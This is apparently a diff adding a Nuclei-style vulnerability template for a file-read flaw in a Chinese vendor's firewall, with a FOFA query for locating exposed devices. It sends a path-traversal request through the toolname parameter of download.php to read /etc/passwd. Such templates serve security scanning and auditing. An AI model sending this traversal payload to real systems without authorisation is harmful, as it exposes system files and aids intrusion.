@@ -1,0 +1,27 @@
+id: netpower-fileRead
+
+info:
+  name: 中科网威下一代防火墙 download.php 文件 toolname 参数 - 文件读取漏洞
+  author: Str1am
+  severity: high
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="Get_Verify_Info(hex_md5(user_string)."
+  tags: netpower,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/download.php?&class=vpn&toolname=../../../../../../../../etc/passwd"
+    
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
